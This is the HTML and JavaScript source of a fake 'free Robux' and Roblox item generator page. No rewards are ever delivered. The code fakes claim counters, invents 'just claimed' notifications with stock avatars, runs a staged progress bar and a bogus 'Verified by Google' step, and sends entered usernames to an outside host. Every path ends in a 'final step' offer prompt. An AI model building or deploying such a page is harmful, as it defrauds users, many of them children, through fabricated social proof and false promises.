<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
  <title>RobloxPlayer | Ultimate Hub</title>
  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;800&family=Bangers&family=Orbitron:wght@400;600;900&family=Cairo:wght@400;600;700;900&family=Montserrat:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <!-- Tailwind for LioRBX part only -->
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <style>
    /* ---------- GLOBAL RESET & BASE (original zeome.site style) ---------- */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      min-height: 100vh;
      font-family: 'Nunito', sans-serif;
      overflow-x: hidden;
      background: radial-gradient(circle at center, #001c44 0%, #000b1a 100%);
    }
    /* stars canvas */
    #stars-canvas {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: 0;
    }
    /* main container - like original card but now with tabs concept? we keep card style for landing then inner content */
    .landing-card {
      position: relative;
      z-index: 20;
      background: #161b27;
      border: 1px solid rgba(255,255,255,0.07);
      border-radius: 20px;
      padding: 48px 56px 40px;
      width: 420px;
      max-width: 85vw;
      text-align: center;
      box-shadow: 0 24px 64px rgba(0,0,0,0.5);
      backdrop-filter: blur(4px);
      margin: 5vh auto;
      transition: 0.3s;
    }
    .logo-wrap {
      width: 88px; height: 88px;
      margin: 0 auto 20px;
      border-radius: 50%;
      background: #2D56FF;
      border: 4px solid #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      animation: logoPulse 3s ease-in-out infinite;
    }
    @keyframes logoPulse { 0%,100% { box-shadow: 0 8px 32px rgba(0,0,0,0.35); } 50% { box-shadow: 0 8px 40px rgba(0,0,0,0.5); } }
    .logo-wrap span { font-family: 'Bangers', cursive; font-size: 3rem; color: #fff; }
    h1 { font-family: 'Bangers', cursive; font-size: 2rem; color: #e8eaf6; margin-bottom: 6px; }
    .subtitle { font-size: 0.9rem; color: #6b7280; margin-bottom: 32px; }
    .btn-group { display: flex; flex-direction: column; gap: 14px; }
    .btn {
      display: block; width: 100%; padding: 16px; border: none; border-radius: 50px;
      font-family: 'Bangers', cursive; font-size: 1.25rem; color: #fff;
      cursor: pointer; transition: 0.2s; text-decoration: none;
    }
    .btn:hover { transform: translateY(-2px); filter: brightness(1.1); }
    .btn-cyan { background: linear-gradient(90deg, #00c9f7, #00d4ff); box-shadow: 0 6px 20px rgba(0,212,255,0.3); }
    .btn-red { background: linear-gradient(90deg, #c72b2b, #e03535); box-shadow: 0 6px 20px rgba(224,53,53,0.3); }
    .btn-green { background: linear-gradient(90deg, #20a832, #27c93f); box-shadow: 0 6px 20px rgba(39,201,63,0.3); }
    footer { margin-top: 32px; font-size: 0.7rem; color: #6b7280; }
    /* internal panel (hidden initially) */
    .internal-panel {
      display: none;
      position: relative;
      z-index: 20;
      max-width: 1400px;
      margin: 20px auto;
      background: transparent;
      border-radius: 28px;
      overflow: hidden;
      animation: fadeSlide 0.4s ease;
    }
    @keyframes fadeSlide {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .back-button {
      background: rgba(0,0,0,0.6);
      backdrop-filter: blur(8px);
      border: none;
      color: white;
      padding: 10px 20px;
      border-radius: 40px;
      font-weight: bold;
      cursor: pointer;
      margin: 15px 20px;
      font-family: 'Bangers', cursive;
      display: inline-block;
      transition: 0.2s;
    }
    .back-button:hover { background: #00d4ff; color: #000; }
    /* tsunami styles */
    .tsunami-full {
      background: radial-gradient(circle at 28% 45%, rgba(0,255,179,.14), transparent 62%),
                  radial-gradient(circle at 75% 50%, rgba(57,255,20,.10), transparent 64%),
                  linear-gradient(135deg, #0a2a43, #061a2b);
      padding: 20px;
      border-radius: 32px;
      color: #bfe9ff;
    }
    /* liorbx container */
    .liorbx-full {
      background: #f3f4f6;
      border-radius: 32px;
      padding: 20px;
    }
    /* toast */
    #toast {
      position: fixed; bottom: 32px; left: 50%; transform: translateX(-50%) translateY(80px);
      background: #1e2535; color: #fff; padding: 12px 24px; border-radius: 50px;
      transition: 0.3s; opacity: 0; z-index: 2000;
    }
    #toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
    /* scrollbar */
    ::-webkit-scrollbar { width: 6px; }
    ::-webkit-scrollbar-track { background: #1e1f2c; }
    ::-webkit-scrollbar-thumb { background: #00d4ff; border-radius: 8px; }
  </style>
  <!-- embedded tsunami & liorbx extra css -->
  <style>
    .item-card { background: linear-gradient(180deg, rgba(255,255,255,.94), rgba(240,252,255,.94)); border-radius: 16px; padding: 10px; cursor: pointer; transition: 0.2s; border: 1px solid rgba(191,233,255,.5); }
    .item-card.selected { background: linear-gradient(135deg, rgba(57,255,20,.92), rgba(0,255,179,.88)); transform: scale(1.02); }
    .item-img { width: 100px; height: 100px; object-fit: cover; border-radius: 12px; margin-bottom: 8px; }
    .og-rarity { border: 3px solid #f5ff69; }
    .celestial-rarity { border: 3px solid #ff7ef9; }
    .secret-rarity { border: 3px solid #e9080c; }
    .active-users-box { background: linear-gradient(180deg, rgba(6,26,43,.92), rgba(4,18,30,.92)); border: 1px solid rgba(191,233,255,.16); border-radius: 13px; padding: 12px 20px; backdrop-filter: blur(6px); }
    .payment-choice, .gem-choice { cursor: pointer; transition: 0.2s; }
    .payment-choice.picked, .gem-choice.picked { border-color: #1291eb !important; background: rgba(18,145,235,0.1); }
    .loader-circle { width: 18px; height: 18px; border: 2px solid rgba(255,255,255,0.3); border-top-color: white; border-radius: 50%; display: inline-block; animation: spin 0.6s linear infinite; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .message-wrapper { position: fixed; top: 80px; right: 20px; z-index: 1100; max-width: 280px; }
    .alert-message { background: white; border-radius: 20px; padding: 12px; margin-bottom: 12px; display: flex; gap: 12px; border-left: 5px solid #10b981; animation: slidein 0.3s; }
    @keyframes slidein { from { transform: translateX(400px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
    .coin-symbol { display: inline-block; width: 28px; height: 28px; background-image: url('https://zeome.site/rbx/images/liorbx_2019_Logo_gold.svg.png'); background-size: contain; background-repeat: no-repeat; vertical-align: middle; }
  </style>
</head>
<body>

<canvas id="stars-canvas"></canvas>
<div id="toast"></div>

<!-- ORIGINAL LANDING CARD (RobloxPlayer style) -->
<div id="landingContainer" class="landing-card">
  <div class="logo-wrap"><span>R</span></div>
  <h1>Welcome RobloxPlayer!</h1>
  <p class="subtitle">Unlock Rewards Instantly</p>
  <div class="btn-group">
    <button class="btn btn-cyan" data-tool="rbx"><i class="fas fa-gem"></i> RBX HERE</button>
    <button class="btn btn-red" data-tool="brainrot"><i class="fas fa-water"></i> STEAL A BRAINROT</button>
    <button class="btn btn-green" data-tool="tsunami"><i class="fas fa-tsunami"></i> ESCAPE TSUNAMI</button>
  </div>
  <footer>© 2026 | All Rights Reserved</footer>
</div>

<!-- INTERNAL PANEL (will show the chosen tool) -->
<div id="internalPanel" class="internal-panel">
  <button id="backToLanding" class="back-button"><i class="fas fa-arrow-left"></i> BACK TO HUB</button>
  <div id="toolContent"></div>
</div>

<script>
  // Stars background (exactly like original)
  const canvas = document.getElementById('stars-canvas');
  const ctx = canvas.getContext('2d');
  let W, H, stars = [];
  function resizeStars() {
    W = canvas.width = window.innerWidth;
    H = canvas.height = window.innerHeight;
    stars = Array.from({length: 150}, () => ({ x: Math.random()*W, y: Math.random()*H, r: Math.random()*1.8, a: Math.random() * 0.8 + 0.2 }));
  }
  function drawStars() {
    ctx.clearRect(0,0,W,H);
    stars.forEach(s => { ctx.beginPath(); ctx.arc(s.x, s.y, s.r, 0, Math.PI*2); ctx.fillStyle = `rgba(255,255,255,${s.a})`; ctx.fill(); });
    requestAnimationFrame(drawStars);
  }
  window.addEventListener('resize', resizeStars);
  resizeStars(); drawStars();

  // Toast
  function showToast(msg) {
    const toast = document.getElementById('toast');
    toast.textContent = msg; toast.classList.add('show');
    setTimeout(() => toast.classList.remove('show'), 2000);
  }

  // Switch between landing and internal tools
  const landing = document.getElementById('landingContainer');
  const internalPanel = document.getElementById('internalPanel');
  const toolContent = document.getElementById('toolContent');
  const backBtn = document.getElementById('backToLanding');

  function showLanding() {
    landing.style.display = 'block';
    internalPanel.style.display = 'none';
  }
  function showTool(toolId) {
    landing.style.display = 'none';
    internalPanel.style.display = 'block';
    // load tool dynamically
    if (toolId === 'rbx') loadLioRBX();
    else if (toolId === 'brainrot' || toolId === 'tsunami') loadTsunamiCollector();
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }

  backBtn.addEventListener('click', showLanding);
  document.querySelectorAll('.btn[data-tool]').forEach(btn => {
    btn.addEventListener('click', (e) => {
      const tool = btn.dataset.tool;
      showToast(`Loading ${tool.toUpperCase()}...`);
      setTimeout(() => showTool(tool), 200);
    });
  });

  // ---------- LioRBX FULL GENERATOR (embedded exact copy of combined functionality) ----------
  function loadLioRBX() {
    toolContent.innerHTML = `
      <div class="liorbx-full">
        <div id="messageWrapper" class="message-wrapper"></div>
        <div class="max-w-md mx-auto">
          <div class="text-center mb-4"><img src="https://zeome.site/rbx/images/seorbx.png" class="h-16 mx-auto"><h1 class="text-2xl font-bold text-purple-700">MEORBX BOOSTER</h1><p class="text-xs">2026 · Roblox Generator</p></div>
          <div class="bg-white/90 rounded-2xl p-4 shadow mb-4 text-center"><div class="text-sm font-bold">🔥 People Who Claimed Today</div><div class="grid grid-cols-2 gap-2 mt-2"><div><div class="coin-symbol mx-auto"></div><div class="text-xl font-black text-green-600" id="coinUsers">10,166</div></div><div><i class="fas fa-gem text-2xl text-blue-400"></i><div class="text-xl font-black text-green-600" id="gemUsers">8,589</div></div></div></div>
          <div id="phase0" class="bg-white rounded-2xl shadow p-4 mb-4"><h2 class="font-bold text-center">Choose Reward</h2><div class="grid grid-cols-2 gap-3 mt-3"><div class="payment-choice border-2 p-3 rounded-xl text-center" data-type="robux"><div class="coin-symbol w-10 h-10 mx-auto"></div><div class="font-black">ROBUX</div></div><div class="payment-choice border-2 p-3 rounded-xl text-center" data-type="diamond"><img src="https://zeome.site/rbx/images/901289026.png" class="w-10 mx-auto"><div class="font-black">DIAMOND</div></div></div></div>
          <div id="phase1" class="bg-white rounded-2xl shadow p-4 hidden"><input type="text" id="userInput" placeholder="Roblox Username" class="w-full border p-2 rounded"><button id="lookupBtn" class="w-full bg-purple-600 text-white py-2 rounded mt-2">SEARCH USER</button><div id="alertBox" class="hidden text-red-500 text-sm"></div><div id="accountCard" class="hidden mt-3 p-3 bg-gray-50 rounded"><img id="profilePic" class="w-12 h-12 rounded-full"><h3 id="fullName"></h3><button id="proceedBtn" class="mt-2 w-full bg-purple-600 text-white py-2 rounded">CONTINUE</button></div></div>
          <div id="phase2" class="bg-white rounded-2xl shadow p-4 hidden"><h2 class="font-bold">Select Robux</h2><div class="grid grid-cols-2 gap-2 mt-2"><button class="coin-selector border p-2 rounded" data-amount="800">800</button><button data-amount="5800">5,800</button><button data-amount="25000">25k</button><button data-amount="100000">100k</button></div></div>
          <div id="phase2_5" class="bg-white rounded-2xl shadow p-4 hidden"><h2 class="font-bold">Select Diamonds</h2><div class="grid grid-cols-2 gap-2"><div class="gem-choice border p-2 rounded text-center" data-amount="100">💎100</div><div data-amount="250">💎250</div><div data-amount="700">💎700</div><div data-amount="7000">💎7000</div></div></div>
          <div id="phase3" class="bg-white rounded-2xl shadow p-4 hidden"><div id="rewardShowcase" class="flex justify-center gap-2"></div><div class="w-full bg-gray-200 h-3 rounded mt-2"><div id="taskBar" class="bg-purple-600 h-3 rounded w-0"></div></div><div id="taskLogs" class="text-xs mt-2 h-24 overflow-auto"></div></div>
          <div id="phase4" class="bg-white rounded-2xl shadow p-4 hidden"><div id="checkSection"><h2 class="font-bold text-center">✅ Verified by Google</h2><div id="prizeShow" class="text-center font-bold my-2"></div><button id="claimBtn" class="w-full bg-green-600 text-white py-3 rounded">NEXT</button></div><div id="doneSection" class="hidden text-center"><i class="fas fa-check-circle text-5xl text-green-500"></i><p class="font-bold">Success!</p><div class="bg-yellow-100 p-2 my-2 rounded">⚠️ Final step required</div><button onclick="_dS()" class="w-full bg-purple-700 text-white py-2 rounded">FINAL STEP</button><div class="text-xs mt-2">⏱️ <span id="timer">05:00</span></div></div></div>
        </div>
      </div>
    `;
    // Initialize LioRBX scripts
    initLioRBXLogic();
  }

  function initLioRBXLogic() {
    let pickedPayment = '', pickedCoin = 0, pickedGem = 0, savedUser = null;
    let coinTotal = 10166, gemTotal = 8589;
    const coinElem = document.getElementById('coinUsers'), gemElem = document.getElementById('gemUsers');
    setInterval(() => { coinTotal += Math.floor(Math.random()*80)+200; gemTotal += Math.floor(Math.random()*60)+150; if(coinElem) coinElem.innerText = coinTotal.toLocaleString(); if(gemElem) gemElem.innerText = gemTotal.toLocaleString(); }, 5000);
    document.querySelectorAll('.payment-choice').forEach(el => {
      el.onclick = () => { document.querySelectorAll('.payment-choice').forEach(c=>c.classList.remove('picked')); el.classList.add('picked'); pickedPayment = el.dataset.type; document.getElementById('phase0').classList.add('hidden'); document.getElementById('phase1').classList.remove('hidden'); };
    });
    const lookupBtn = document.getElementById('lookupBtn'), userInput = document.getElementById('userInput'), alertBox = document.getElementById('alertBox'), accountCardDiv = document.getElementById('accountCard'), profilePic = document.getElementById('profilePic'), fullNameSpan = document.getElementById('fullName'), proceedBtn = document.getElementById('proceedBtn');
    window.fetchUserRBX = async function() {
      let username = userInput.value.trim();
      if(!username){ alertBox.innerText='Enter username'; alertBox.classList.remove('hidden'); return; }
      alertBox.classList.add('hidden'); lookupBtn.disabled=true; lookupBtn.innerHTML='<span class="loader-circle"></span>';
      try {
        let res = await fetch(`https://abadaoucht.com/tiktok/api/roblox/userinfo/${username}`);
        let data = await res.json();
        if(data.status==='SUCCESS'){
          savedUser = { name: data.user_name, avatar: data.avatar || 'https://www.roblox.com/avatar-thumbnail?width=200' };
          profilePic.src = savedUser.avatar; fullNameSpan.innerText = savedUser.name;
          accountCardDiv.classList.remove('hidden');
        } else { alertBox.innerText='User not found'; alertBox.classList.remove('hidden'); }
      } catch(e){ alertBox.innerText='API error'; alertBox.classList.remove('hidden'); }
      finally{ lookupBtn.disabled=false; lookupBtn.innerHTML='SEARCH USER'; }
    };
    lookupBtn.onclick = window.fetchUserRBX;
    proceedBtn.onclick = () => { if(!savedUser) return; document.getElementById('phase1').classList.add('hidden'); if(pickedPayment==='robux') document.getElementById('phase2').classList.remove('hidden'); else document.getElementById('phase2_5').classList.remove('hidden'); };
    document.querySelectorAll('.coin-selector').forEach(btn => { btn.onclick = () => { pickedCoin = parseInt(btn.dataset.amount); document.getElementById('phase2').classList.add('hidden'); startProgress('robux', pickedCoin); }; });
    document.querySelectorAll('.gem-choice').forEach(gem => { gem.onclick = () => { document.querySelectorAll('.gem-choice').forEach(g=>g.classList.remove('picked')); gem.classList.add('picked'); pickedGem = parseInt(gem.dataset.amount); document.getElementById('phase2_5').classList.add('hidden'); startProgress('diamond', pickedGem); }; });
    function startProgress(type, amount) {
      let phase3 = document.getElementById('phase3'), phase4 = document.getElementById('phase4');
      phase3.classList.remove('hidden');
      let rewardIcon = type==='robux' ? '<div class="coin-symbol w-8 h-8"></div>' : '<img src="https://zeome.site/rbx/images/901289026.png" class="w-8">';
      document.getElementById('rewardShowcase').innerHTML = rewardIcon + `<span class="text-xl font-black ml-2">${amount.toLocaleString()}</span>`;
      let percent=0, bar=document.getElementById('taskBar'), logs=document.getElementById('taskLogs');
      logs.innerHTML = '<div>🔌 Connecting to Roblox...</div>';
      let interval = setInterval(()=>{ percent+=Math.floor(Math.random()*6)+3; if(percent>=100){ percent=100; clearInterval(interval); logs.innerHTML+='<div>✅ Ready! Verifying...</div>'; setTimeout(()=>{ phase3.classList.add('hidden'); phase4.classList.remove('hidden'); document.getElementById('prizeShow').innerHTML = `<span class="text-purple-700 font-bold">${amount.toLocaleString()} ${type.toUpperCase()}</span> ready for ${savedUser.name}`; },800); } bar.style.width=percent+'%'; if(percent===40) logs.innerHTML+='<div>🔍 Account check passed</div>'; if(percent===75) logs.innerHTML+='<div>💎 Generating assets...</div>'; }, 180);
    }
    const claimBtn = document.getElementById('claimBtn'), checkSection = document.getElementById('checkSection'), doneSection = document.getElementById('doneSection');
    claimBtn.onclick = () => { checkSection.classList.add('hidden'); doneSection.classList.remove('hidden'); let time=300, timerSpan=document.getElementById('timer'); let count=setInterval(()=>{ if(time<=0) clearInterval(count); let mins=Math.floor(time/60), secs=time%60; timerSpan.innerText=`${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`; time--; },1000); };
    // fake claim notifications
    const fakeNames = ['Ethan_Boss','Sarah_RBLX','Leo_Pro','Zara_King'];
    setInterval(()=>{ let wrapper = document.getElementById('messageWrapper'); if(!wrapper) return; let msg = document.createElement('div'); msg.className='alert-message'; msg.innerHTML = `<img src="https://randomuser.me/api/portraits/thumb/men/${Math.floor(Math.random()*30)}.jpg" class="w-9 h-9 rounded-full"><div><b>${fakeNames[Math.floor(Math.random()*fakeNames.length)]}</b><div class="text-xs">claimed ${Math.floor(Math.random()*3000)+500} Robux</div></div>`; wrapper.appendChild(msg); setTimeout(()=>msg.remove(),5000); }, 8000);
  }

  // ---------- ESCAPE TSUNAMI / BRAINROT COLLECTOR ----------
  function loadTsunamiCollector() {
    toolContent.innerHTML = `
      <div class="tsunami-full" style="padding:20px">
        <div class="logo-container text-center"><img src="https://zeome.site/tsunami/logo.png" style="max-width:140px"></div>
        <div class="top-bar flex justify-center my-3"><div class="active-users-box flex gap-3"><span>🌊 Active users:</span><span id="tsActiveCount" class="text-neon">247</span></div></div>
        <div class="select-title text-center text-2xl font-black my-4">⚡ SELECT AN ITEM YOU WISH TO GET ⚡</div>
        <div class="items-grid grid grid-cols-2 md:grid-cols-4 gap-4" id="tsItemsGrid"></div>
        <div class="cliameds" id="tsNotifBox" style="position:fixed; bottom:20px; left:20px; z-index:99;"></div>
      </div>
      <div id="tsPopup" class="fixed inset-0 bg-black/80 flex items-center justify-center z-[2000] hidden"><div id="tsPopupContent" class="bg-gradient-to-b from-cyan-900 to-slate-800 rounded-2xl p-6 max-w-sm w-full text-white text-center"></div></div>
    `;
    const itemsData = [
      { name: 'Strawberry Elephant', img: 'https://zeome.site/tsunami/Strawberry_elephant.webp', rarity: 'og' },
      { name: 'Burgerini Bearini', img: 'https://zeome.site/tsunami/Burger_Bear.webp', rarity: 'og' },
      { name: 'Bulbito Bandito', img: 'https://zeome.site/tsunami/Bulbito_Bandito_Traktorito.webp', rarity: 'og' },
      { name: 'Alessio', img: 'https://zeome.site/tsunami/Alessio.webp', rarity: 'celestial' },
      { name: 'Dug Dug Dug', img: 'https://zeome.site/tsunami/Dug-Dug-Dug.webp', rarity: 'celestial' },
      { name: 'Unclito Samito', img: 'https://zeome.site/tsunami/Unclito.webp', rarity: 'secret' },
      { name: 'Fragola La La La', img: 'https://zeome.site/tsunami/Fragola%20La%20La%20La.webp', rarity: 'secret' },
      { name: 'La Vacca Saturno', img: 'https://zeome.site/tsunami/La%20Vacca%20Saturno%20Saturnita.webp', rarity: 'common' },
      { name: 'Chimpanzini Spiderini', img: 'https://zeome.site/tsunami/Chimpanzini%20Spiderini.webp', rarity: 'common' },
      { name: 'Brr Brr Patapim', img: 'https://zeome.site/tsunami/Brr%20Brr%20Patapim.webp', rarity: 'common' }
    ];
    const grid = document.getElementById('tsItemsGrid');
    grid.innerHTML = itemsData.map(item => `<div class="item-card ${item.rarity}-rarity" data-name="${item.name}" data-img="${item.img}"><img class="item-img w-24 h-24 mx-auto rounded" src="${item.img}"><div class="item-name font-bold text-black">${item.name}</div></div>`).join('');
    // active users random
    function randActive() { return Math.floor(Math.random() * (700 - 80 + 1) + 80); }
    setInterval(() => { let cntSpan = document.getElementById('tsActiveCount'); if(cntSpan) cntSpan.innerText = randActive(); }, 4000);
    // claim notifications
    const notifBox = document.getElementById('tsNotifBox');
    const usernames = ['MADELYN2','zontir99','marcos10','Queen_lisa1','LANA11','tbonmk2'];
    const avatars = ['https://randomuser.me/api/portraits/women/1.jpg','https://randomuser.me/api/portraits/men/2.jpg','https://randomuser.me/api/portraits/men/3.jpg'];
    let notifInterval;
    function startNotifsTs() { if(window.tsPopupOpen) return; notifInterval = setInterval(()=>{ if(window.tsPopupOpen || !notifBox) return; let randItem = itemsData[Math.floor(Math.random()*itemsData.length)].name; let randUser = usernames[Math.floor(Math.random()*usernames.length)]; let avatar = avatars[Math.floor(Math.random()*avatars.length)]; notifBox.style.display='block'; notifBox.innerHTML = `<div class="message bg-black/60 backdrop-blur p-2 flex gap-3 rounded-full"><img src="${avatar}" class="w-10 h-10 rounded-full"><div><b>${randUser}</b><div class="text-xs">JUST CLAIMED '${randItem}'</div></div></div>`; setTimeout(()=>{ if(notifBox) notifBox.style.display='none'; },4000); }, 5500); }
    function stopNotifsTs() { clearInterval(notifInterval); if(notifBox) notifBox.style.display='none'; }
    startNotifsTs();
    // popup logic
    const popupDiv = document.getElementById('tsPopup');
    const popupContent = document.getElementById('tsPopupContent');
    function closeTsPopup() { popupDiv.classList.add('hidden'); window.tsPopupOpen=false; startNotifsTs(); }
    window.showTsPopup = (itemName, itemImg) => {
      window.tsPopupOpen=true; stopNotifsTs();
      popupDiv.classList.remove('hidden');
      popupContent.innerHTML = `<h3 class="text-xl font-bold">GET ITEM</h3><img src="${itemImg}" class="w-28 h-28 rounded-full mx-auto my-3"><p>Claim "<b>${itemName}</b>"?</p><input id="tsUsername" placeholder="Roblox username" class="w-full p-2 rounded bg-gray-800 border my-2"><div class="flex gap-2 mt-3"><button id="tsCancel" class="bg-gray-600 px-4 py-2 rounded">Cancel</button><button id="tsConfirm" class="bg-green-500 px-4 py-2 rounded">Continue</button></div>`;
      document.getElementById('tsCancel').onclick = closeTsPopup;
      document.getElementById('tsConfirm').onclick = async () => {
        let user = document.getElementById('tsUsername').value.trim();
        if(!user){ alert('Enter username'); return; }
        popupContent.innerHTML = `<div class="text-center py-4"><div class="loader-circle mx-auto"></div><p>Verifying @${user}...</p></div>`;
        try {
          let res = await fetch(`https://abadaoucht.com/tiktok/api/roblox/userinfo/${user}`);
          let data = await res.json();
          if(data.status==='SUCCESS'){
            popupContent.innerHTML = `<div class="text-center"><i class="fas fa-check-circle text-4xl text-green-400"></i><p>User verified! Transferring item...</p></div>`;
            setTimeout(() => { if(window._yy) window._yy(); closeTsPopup(); }, 1500);
          } else { popupContent.innerHTML = `<p class="text-red-400">User not found. <button id="retryBtn" class="bg-blue-600 px-3 py-1 rounded">Retry</button></p>`; document.getElementById('retryBtn')?.addEventListener('click',()=>window.showTsPopup(itemName,itemImg)); }
        } catch(e) { popupContent.innerHTML='<p class="text-red-400">Network error. Try again</p><button onclick="location.reload()">Reload</button>'; }
      };
    };
    document.querySelectorAll('#tsItemsGrid .item-card').forEach(card => {
      card.addEventListener('click', (e) => {
        document.querySelectorAll('#tsItemsGrid .item-card').forEach(c=>c.classList.remove('selected'));
        card.classList.add('selected');
        let name = card.dataset.name, img = card.dataset.img;
        if(name && img) window.showTsPopup(name, img);
      });
    });
  }

  // global functions for final step (simulate offer)
  window._yy = function() { if(window.xfOpenModal) window.xfOpenModal(); else { showToast("Complete verification in new tab (simulated)."); setTimeout(()=>{ window.open('https://example.com/offer', '_blank'); },500); } };
  window._dS = function() { window._yy(); };
  // XF modal stub (to avoid errors)
  window.xfOpenModal = function() { showToast("Verification required: complete the offer."); };
  // initial landing visible
  showLanding();
</script>
